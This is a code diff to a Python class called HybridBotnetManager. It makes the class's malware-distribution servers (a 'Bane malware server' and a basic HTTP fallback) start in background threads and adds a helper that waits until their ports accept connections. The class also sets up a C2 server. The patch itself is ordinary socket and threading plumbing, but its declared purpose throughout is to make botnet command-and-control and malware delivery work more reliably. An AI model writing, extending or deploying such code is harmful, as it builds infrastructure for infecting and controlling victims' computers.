@@ -159,6 +159,18 @@ class HybridBotnetManager:
             print(f"❌ Failed to initialize C2 server: {e}")
             return False
     
+    def _wait_for_port(self, host: str, port: int, timeout_seconds: int = 5) -> bool:
+        """Wait for a TCP port to accept connections."""
+        import socket, time
+        deadline = time.time() + timeout_seconds
+        while time.time() < deadline:
+            try:
+                with socket.create_connection((host, port), timeout=1):
+                    return True
+            except Exception:
+                time.sleep(0.2)
+        return False
+
     def initialize_malware_server(self):
         """Initialize malware distribution server"""
         try:
@@ -174,8 +186,22 @@ class HybridBotnetManager:
                         host=self.config['c2_host'],
                         port=self.config['malware_port']
                     )
-                    print(f"✅ Bane malware server running on port {self.config['malware_port']}")
-                    return True
+                    # Start Bane malware server in background thread
+                    import threading
+                    def _run_bane_server():
+                        try:
+                            self.malware_server.run()
+                        except Exception as e:
+                            print(f"❌ Bane malware server thread error: {e}")
+                    t = threading.Thread(target=_run_bane_server, daemon=True)
+                    t.start()
+                    # Verify port is up
+                    host_to_check = self.config['c2_host'] if self.config['c2_host'] != '0.0.0.0' else '127.0.0.1'
+                    if self._wait_for_port(host_to_check, self.config['malware_port'], timeout_seconds=5):
+                        print(f"✅ Bane malware server running on port {self.config['malware_port']}")
+                        return True
+                    else:
+                        print("⚠️  Bane malware server did not start listening in time")
                 except Exception as e:
                     print(f"⚠️  Bane malware server failed: {e}")
             
@@ -244,9 +270,13 @@ class HybridBotnetManager:
             malware_thread = threading.Thread(target=run_malware_server, daemon=True)
             malware_thread.start()
             
-            # Give server time to start
-            import time
-            time.sleep(1)
+            # Wait and verify port is up
+            host_to_check = self.config.get('c2_host', '0.0.0.0')
+            if host_to_check == '0.0.0.0':
+                host_to_check = '127.0.0.1'
+            if not self._wait_for_port(host_to_check, self.config['malware_port'], timeout_seconds=5):
+                print("❌ Malware server failed to bind port")
+                return False
             
             # Store reference
             self.malware_server = {
@@ -328,6 +358,14 @@ class HybridBotnetManager:
             server_thread = threading.Thread(target=run_basic_server, daemon=True)
             server_thread.start()
             
+            # Verify listening
+            host_to_check = self.config.get('c2_host', '0.0.0.0')
+            if host_to_check == '0.0.0.0':
+                host_to_check = '127.0.0.1'
+            if not self._wait_for_port(host_to_check, self.config['malware_port'], timeout_seconds=5):
+                print("❌ Basic HTTP malware server failed to bind port")
+                return False
+            
             # Store reference
             self.malware_server = {
                 'thread': server_thread,
@@ -337,9 +375,8 @@ class HybridBotnetManager:
             
             print(f"✅ Basic HTTP malware server running on port {self.config['malware_port']}")
             return True
-            
         except Exception as e:
-            print(f"❌ Basic HTTP malware server failed: {e}")
+            print(f"❌ Basic malware server failed: {e}")
             return False
     
     def initialize_web_interface(self):
